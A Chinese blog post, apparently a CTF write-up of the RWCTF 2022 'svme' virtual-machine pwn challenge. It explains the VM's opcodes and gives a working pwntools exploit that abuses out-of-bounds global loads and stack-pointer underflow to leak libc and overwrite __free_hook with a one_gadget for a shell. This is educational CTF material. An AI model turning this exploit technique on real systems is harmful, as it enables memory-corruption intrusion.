+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> GLOAD: <span class="comment">// load from global memory</span></span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = vm-&gt;globals[addr];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> STORE:</span><br><span class="line">    offset = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;call_stack[callsp].locals[offset] = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> GSTORE: <span class="comment">// store to global variable</span></span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;globals[addr] = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到对于全局变量，会被放在不同于之前locals的栈中，以便所有函数都可以访问到。注意这里store指令设置了<code>locals</code>数组，记录了在多少偏移量位置，放置什么参数。其中参数就是之前在栈上的，使用GLOAD设置的内容。通过以下程序片段，能够更好的理解以上两个操作数。</p>
+<p><img src="/.io//image-20220127121027358.png" alt="image-20220127121027358"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PRINT:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, vm-&gt;<span class="built_in">stack</span>[sp--]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> POP:</span><br><span class="line">    --sp;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>print和pop函数自然不用说。注意这里pop似乎是只减少栈指针，并不返回数据。不过可以和print结合使用。</p>
+<p>比较重要的是<code>call</code>指令，该指令的作用是调用函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CALL:</span><br><span class="line">    <span class="comment">// expects all args on stack</span></span><br><span class="line">    addr = vm-&gt;code[ip++];			<span class="comment">// index of target function</span></span><br><span class="line">    <span class="type">int</span> nargs = vm-&gt;code[ip++]; 	<span class="comment">// how many args got pushed</span></span><br><span class="line">    <span class="type">int</span> nlocals = vm-&gt;code[ip++]; 	<span class="comment">// how many locals to allocate</span></span><br><span class="line">    ++callsp; <span class="comment">// bump stack pointer to reveal space for this call</span></span><br><span class="line">    vm_context_init(&amp;vm-&gt;call_stack[callsp], ip, nargs+nlocals);</span><br><span class="line">    <span class="comment">// copy args into new context</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;nargs; i++) &#123;</span><br><span class="line">        vm-&gt;call_stack[callsp].locals[i] = vm-&gt;<span class="built_in">stack</span>[sp-i];</span><br><span class="line">    &#125;</span><br><span class="line">    sp -= nargs;</span><br><span class="line">    ip = addr;		<span class="comment">// jump to function</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>调用的过程如下</p>
+<ul>
+<li>栈上第一个数据是调用函数地址</li>
+<li>第二个数据是调用时参数个数</li>
+<li>第三个数据是被调函数(callee)本地局部变量数量。</li>
+</ul>
+<p>接下来自增栈指针，表示切换栈到此函数位置。初始化callee调用栈。其中vm_context_init内容如下所示。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> returnip;</span><br><span class="line">    <span class="type">int</span> locals[DEFAULT_NUM_LOCALS];</span><br><span class="line">&#125; Context;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">vm_context_init</span><span class="params">(Context *ctx, <span class="type">int</span> ip, <span class="type">int</span> nlocals)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ( nlocals&gt;DEFAULT_NUM_LOCALS ) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;too many locals requested: %d\n&quot;</span>, nlocals);</span><br><span class="line">    &#125;</span><br><span class="line">    ctx-&gt;returnip = ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到也没有做很多事情。主要是设置了<code>context-&gt;returnip</code>。这个我们后面也会用到。</p>
+<p>接下来把原先栈（caller）的参数拷贝到被调栈中，修改caller的栈指针位置（减去之前复制好的参数）</p>
+<p>最后把ip寄存器改成当前要执行函数的第一条地址。</p>
+<p>最后的ret函数，确保能够回到caller。这里似乎可以看出，调用栈深度只能支持1，因为每次复制参数都是从main的栈中复制的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> RET:</span><br><span class="line">    ip = vm-&gt;call_stack[callsp].returnip;</span><br><span class="line">    callsp--; <span class="comment">// pop context</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>returnip</code>正是上面所设置的。至此我们分析完了vm_exec中的所有指令。可以看出还是比较简单的。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="/.io//image-20220127112521974.png" alt="image-20220127112521974"></p>
+<p>保护全开的虚拟机。回想一下创建虚拟机时是在堆上，所有的指令也都在堆上，因此栈溢出也无法实现，但是堆相关的操作也仅仅有开始的create和结尾的free，操作受限十分严重。一开始我就分析到这里，没有了思路。</p>
+<p>参考的hackinTN的<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/32099">wp</a>，接下来做一点分析。</p>
+<h3 id="step1-get-host-stack"><a href="#step1-get-host-stack" class="headerlink" title="step1: get host stack"></a>step1: get host stack</h3><p>注意到VM结构体里面code指针指向的是从host输入的指针。我们需要得到这个数据。利用对global一开始设置的大小为0，可以实现向上溢出，复制到我们的虚拟机栈空间。由于VM本身是64位的，需要经过两次load得到较大和较小的两个值。一旦得到了这个数据，就可以<strong>覆盖globals指针为这个值从而对栈操作</strong>。（关键还是覆盖指针）这里的0x2100是因为vm结构体大小是0x2100，这样的偏移对应的正好是code指针。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gload &#123;-0x2100 // 4 + 1&#125;</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">gload &#123;-0x2100 // 4&#125;</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">code=<span class="string">b&quot;&quot;</span></span><br><span class="line">code+=p32(<span class="number">11</span>) + p32(<span class="number">0xfffff7c1</span>) </span><br><span class="line">code+=p32(<span class="number">12</span>) + p32(<span class="number">0x0</span>)</span><br><span class="line">code+=p32(<span class="number">11</span>) + p32(<span class="number">0xfffff7c0</span>)</span><br><span class="line">code+=p32(<span class="number">12</span>) + p32(<span class="number">0x1</span>)</span><br><span class="line">code+=p32(<span class="number">14</span>)</span><br><span class="line">code+=p32(<span class="number">14</span>)</span><br><span class="line">code+=p32(<span class="number">14</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>目的相当于是把libc_start_main加载到vm栈空间，后面用来计算free_hook。这里的偏移通过调试得到libc相关地址和globals指针的偏移量（在main函数的ret中，一定包含libc_start_main）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step2 get __libc_start_main, using gdb to find __libc_start_main is 0x218 to *globals</span></span><br><span class="line"><span class="comment"># load it to stack</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">load 1</span></span><br><span class="line"><span class="string">load 0</span></span><br><span class="line"><span class="string">iconst 0</span></span><br><span class="line"><span class="string">gload &#123;0x218 // 4 + 1&#125;</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">gload &#123;0x218 // 4&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code+=p32(LOAD) + p32(<span class="number">1</span>)</span><br><span class="line">code+=p32(LOAD) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(ICONST) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">135</span>)</span><br><span class="line">code+=p32(STORE) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">134</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p>第三步：计算libc基地址以及free_hook地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step3 get free_hook, now libc_addr is already on the vm stack, we can using it to calculate free_hook addr</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">iconst &#123;libc.libc_start_main_return&#125;</span></span><br><span class="line"><span class="string">isub</span></span><br><span class="line"><span class="string">iconst &#123;libc.symbols[&#x27;__free_hook&#x27;]&#125;</span></span><br><span class="line"><span class="string">iadd&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code+=p32(ICONST) + p32(libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>])</span><br><span class="line">code+=p32(ISUB) <span class="comment"># get libc_base and store on VM&#x27;s stack</span></span><br><span class="line">code+=p32(ICONST) + p32(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])</span><br><span class="line">code+=p32(IADD) <span class="comment"># libc_base+free_hook store on vm&#x27;s stack</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h3><p>接下来要做两件事情：</p>
+<ul>
+<li>覆盖*data为free_hook，从而可以写*free_hook（虚拟机内部解引用*data）</li>
+<li>计算one_gardet，覆盖free_hook</li>
+</ul>
+<p>注意到<code>print</code>指令能够单纯使得栈指针减少，通过它我们能够很轻松的实现sp下溢出。结合store就可以在vm结构体中越界覆盖指针。</p>
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>首先看到globals地址</p>
+<p><img src="/.io//image-20220127222913557.png" alt="image-20220127222913557"></p>
+<p>之后还会创建一个很诡异的，大小为0x400的堆，这个让我迷惑了很久。后来才看见是printf自己创建的。印象里在2021国赛的题目中见到过，似乎还利用了创建堆的性质。</p>
+<p><img src="/.io//image-20220127223151235.png" alt="image-20220127223151235"></p>
+<p>这里看到经过step1，globals指针地址已经被改掉</p>
+<p><img src="/.io//image-20220128095331460.png" alt="image-20220128095331460"></p>
+<p>接下来到gload {0x218 / 4 + 1}这里，要找libc_start_main地址。</p>
+<p>在gdb中可以看到存在这样一条地址。</p>
+<p><img src="/.io//image-20220128095752952.png" alt="image-20220128095752952"></p>
+<p><img src="/.io//image-20220128095738557.png" alt="image-20220128095738557"></p>
+<p>可以看出来和libc比较接近。只要找到偏移减一下就可以了。</p>
+<p><img src="/.io//image-20220128095928257.png" alt="image-20220128095928257"></p>
+<p>可以看到能够拿到正确的libc</p>
+<p><img src="/.io//image-20220128100347355.png" alt="image-20220128100347355"></p>
+<p>之后三次print让栈指针减少，我们的目的又是修改globals指针为free_hook，从而写free_hook。</p>
+<p>在没有修改的时候</p>
+<p><img src="/.io//image-20220128100631983.png" alt="image-20220128100631983"></p>
+<p>经过load 1 和load 0之后（相当于调用栈是我们的一个临时储存栈）数据将被保存在sp指向的位置。可以看到已经成功写入了free_hook地址。</p>
+<p><img src="/.io//image-20220128100845424.png" alt="image-20220128100845424"></p>
+<p>之后其实保险点可以system(“/bin/sh”)因为我们也可以掌握VM中的数据。这里先尝试og了。</p>
+<p>之后栈平衡，我们把free_hook又拿回来到vm栈空间。因为得到的free_hook地址减去free_hook的符号偏移，加上og地址就可以得到最终地址。</p>
+<p>最后两部直接用gsstore，不能用load（思考，为什么？）因为这里要写<code>globals[addr]</code>，也就是修改*globals，即globals指针中的内容。但是load是写<code>vm-&gt;stack[++sp]</code>，也就是修改Globals指针。因此要用两种修改方法。</p>
+<p>至此完成了改写free_hook。使用第二个ong_gardet，成功获取shell</p>
+<p><img src="/.io//image-20220128104118667.png" alt="image-20220128104118667"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./svme&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOOP    = <span class="number">0</span></span><br><span class="line">IADD    = <span class="number">1</span>   </span><br><span class="line">ISUB    = <span class="number">2</span></span><br><span class="line">IMUL    = <span class="number">3</span></span><br><span class="line">ILT     = <span class="number">4</span>   </span><br><span class="line">IEQ     = <span class="number">5</span>   </span><br><span class="line">BR      = <span class="number">6</span>  </span><br><span class="line">BRT     = <span class="number">7</span>  </span><br><span class="line">BRF     = <span class="number">8</span>  </span><br><span class="line">ICONST  = <span class="number">9</span>  </span><br><span class="line">LOAD    = <span class="number">10</span>  </span><br><span class="line">GLOAD   = <span class="number">11</span>  </span><br><span class="line">STORE   = <span class="number">12</span> </span><br><span class="line">GSTORE  = <span class="number">13</span>  </span><br><span class="line">PRINT   = <span class="number">14</span>  </span><br><span class="line">POP     = <span class="number">15</span>  </span><br><span class="line">CALL    = <span class="number">16</span>  </span><br><span class="line">RET     = <span class="number">17</span>  </span><br><span class="line">HALT    = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">og=[<span class="number">0xe6c7e</span>,<span class="number">0xe6c81</span>,<span class="number">0xe6c84</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd=<span class="string">&quot;brva 0x1989&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># step1: get host stack info</span></span><br><span class="line"><span class="comment"># 0xfffff7c1 = (-0x2100/4+1) ----&gt; code pointer</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gload &#123;-0x2100 // 4 + 1&#125;</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">gload &#123;-0x2100 // 4&#125;</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">code=<span class="string">b&quot;&quot;</span></span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">0xfffff7c1</span>) </span><br><span class="line">code+=p32(STORE) + p32(<span class="number">0x0</span>)</span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">0xfffff7c0</span>)</span><br><span class="line">code+=p32(STORE) + p32(<span class="number">0x1</span>)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># step2 get __libc_start_main, using gdb to find __libc_start_main is 0x218 to *globals</span></span><br><span class="line"><span class="comment"># load it to stack</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">load 1</span></span><br><span class="line"><span class="string">load 0</span></span><br><span class="line"><span class="string">iconst 0</span></span><br><span class="line"><span class="string">gload &#123;0x218 // 4 + 1&#125;</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">gload &#123;0x218 // 4&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code+=p32(LOAD) + p32(<span class="number">1</span>)</span><br><span class="line">code+=p32(LOAD) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(ICONST) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">135</span>)</span><br><span class="line">code+=p32(STORE) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">134</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 get free_hook, now libc_addr is already on the vm stack, we can using it to calculate free_hook addr</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">iconst &#123;libc.libc_start_main_return&#125;</span></span><br><span class="line"><span class="string">isub</span></span><br><span class="line"><span class="string">iconst &#123;libc.symbols[&#x27;__free_hook&#x27;]&#125;</span></span><br><span class="line"><span class="string">iadd&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code+=p32(ICONST) + p32(<span class="number">159923</span>) <span class="comment"># using gdb</span></span><br><span class="line">code+=p32(ISUB) <span class="comment"># get libc_base and store on VM&#x27;s stack</span></span><br><span class="line">code+=p32(ICONST) + p32(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])</span><br><span class="line">code+=p32(IADD) <span class="comment"># libc_base+free_hook store on vm&#x27;s stack</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># step4: replace free_hook</span></span><br><span class="line"><span class="comment"># first store free_hook to *data, then replace it woth og</span></span><br><span class="line"><span class="comment"># one_gadget_address = __free_hook - libc.symbols[&#x27;__free_hook&#x27;] + one_gadget_offset</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">load 1</span></span><br><span class="line"><span class="string">load 0</span></span><br><span class="line"><span class="string">iconst 0</span></span><br><span class="line"><span class="string">load 0</span></span><br><span class="line"><span class="string">load 1</span></span><br><span class="line"><span class="string">iconst &#123;libc.symbols[&#x27;__free_hook&#x27;]&#125;</span></span><br><span class="line"><span class="string">isub</span></span><br><span class="line"><span class="string">iconst &#123;one_gadget&#125;</span></span><br><span class="line"><span class="string">iadd</span></span><br><span class="line"><span class="string">gstore 0</span></span><br><span class="line"><span class="string">gstore 1</span></span><br><span class="line"><span class="string">halt&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code+=p32(STORE)+p32(<span class="number">1</span>)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line">code+=p32(LOAD)+p32(<span class="number">1</span>)      <span class="comment"># Replace the `data` ptr</span></span><br><span class="line">code+=p32(LOAD)+p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(ICONST)+p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(LOAD)+p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(LOAD)+p32(<span class="number">1</span>)</span><br><span class="line">code+=p32(ICONST)+p32(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])</span><br><span class="line">code+=p32(ISUB)</span><br><span class="line">code+=p32(ICONST)+p32(og[<span class="number">1</span>])</span><br><span class="line">code+=p32(IADD)</span><br><span class="line">code+=p32(GSTORE)+p32(<span class="number">0</span>)    <span class="comment"># Overwrite the `__free_hook`</span></span><br><span class="line">code+=p32(GSTORE)+p32(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># code+=p32(19)               # trigger warning</span></span><br><span class="line">code+=p32(HALT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">code = code.ljust(<span class="number">512</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">io.send(code)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20220128104118667.png" alt="image-20220128104118667"></p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>这是难得的可以从源代码角度辅助逆向分析VM的机会。幸好这是一个没有去除符号表的vm(想起来上次逆第五空间没有符号表的vm简直是醉了)</p>
+<p><img src="/.io//image-20220128104445484.png" alt="image-20220128104445484"></p>
+<p>vm_create和vm_init中还是一目了然的</p>
+<p><img src="/.io//image-20220128104545214.png" alt="image-20220128104545214"></p>
+<p><img src="/.io//image-20220128104600579.png" alt="image-20220128104600579"></p>
+<p>这里比较头疼的地方就是不知道这些指针代表着什么。不过可以通过有名称的函数对其的操作辅助理解。</p>
+<p>关键的exec跳转位置</p>
+<p><img src="/.io//image-20220128104808492.png" alt="image-20220128104808492"></p>
+<p>由于是switch case，ida无法识别出来，确实。。很难看明白</p>
+<p><img src="/.io//image-20220128105202395.png" alt="image-20220128105202395"></p>
+<p>不知道有没有合适的插件，如果没有只能动态调试看看了。还是很复杂的。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-01-27, 09:29:34</p>
+        <p><span>最后更新:</span>2023-07-12, 19:09:26</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/01/27/RWctf-2022-svme/" title="RWctf-2022-svme">https://nicholas-wei.github.io/2022/01/27/RWctf-2022-svme/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://nicholas-wei.github.io/2022/01/27/RWctf-2022-svme/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">
+                    hws2022冬令营入营赛pwn
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/01/24/kernel-2-stkof/">
+                    kernel-2-stkof
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
